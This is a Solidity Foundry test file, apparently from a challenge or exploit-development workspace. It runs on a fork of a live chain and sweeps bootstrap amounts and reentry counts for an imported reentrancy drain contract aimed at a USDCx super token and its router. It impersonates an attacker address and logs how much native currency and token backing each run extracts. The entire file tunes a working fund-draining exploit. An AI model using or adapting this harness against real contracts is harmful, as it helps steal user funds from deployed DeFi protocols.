// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5ERC20Drain} from "../exploit/Run.s.sol";

interface IERC20View46 {
    function balanceOf(address account) external view returns (uint256);
}

interface ISuperTokenView46 {
    function getUnderlyingToken() external view returns (address);
}

/// @notice Reentry-count sweep for the live USDCx continuation surface.
/// @dev The goal is to find the highest stable reentry count that still avoids
///      the later-round SafeCast ceiling on the current fork head.
contract Attempt46ReentryTuneTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_tune_reentry_counts_on_live_usdcx() public {
        uint256[] memory bootstraps = new uint256[](3);
        bootstraps[0] = 100 ether;
        bootstraps[1] = 250 ether;
        bootstraps[2] = 500 ether;

        uint256[] memory reentries = new uint256[](6);
        reentries[0] = 10;
        reentries[1] = 12;
        reentries[2] = 14;
        reentries[3] = 16;
        reentries[4] = 18;
        reentries[5] = 20;

        for (uint256 i = 0; i < bootstraps.length; ++i) {
            for (uint256 j = 0; j < reentries.length; ++j) {
                uint256 snap = vm.snapshotState();
                _probe(bootstraps[i], reentries[j]);
                vm.revertToState(snap);
            }
        }
    }

    function _probe(uint256 bootstrapNative, uint256 reentryCount) internal {
        address underlying = ISuperTokenView46(USDCX).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20View46(underlying).balanceOf(USDCX);

        vm.startPrank(ATTACKER);
        Ch5ERC20Drain drain = new Ch5ERC20Drain(USDCX, ROUTER, 630_000_000 + uint32(reentryCount * 1000), address(0));
        try drain.executeDrain{value: bootstrapNative}(3, reentryCount) returns (
            uint256 roundsExecuted,
            uint256 nativeOut
        ) {
            uint256 nativeAfter = ATTACKER.balance;
            uint256 backingAfter = IERC20View46(underlying).balanceOf(USDCX);
            console.log("SUCCESS bootstrap:", bootstrapNative);
            console.log("SUCCESS reentry:", reentryCount);
            console.log("SUCCESS rounds executed:", roundsExecuted);
            console.log("SUCCESS native out:", nativeOut);
            console.log("SUCCESS native delta:", nativeAfter - nativeBefore);
            console.log("SUCCESS backing delta:", backingBefore - backingAfter);
        } catch Error(string memory reason) {
            console.log("ERROR bootstrap:", bootstrapNative);
            console.log("ERROR reentry:", reentryCount);
            console.log("ERROR reason:", reason);
        } catch (bytes memory data) {
            console.log("LOWLEVEL bootstrap:", bootstrapNative);
            console.log("LOWLEVEL reentry:", reentryCount);
            console.logBytes(data);
        }
        vm.stopPrank();
    }
}
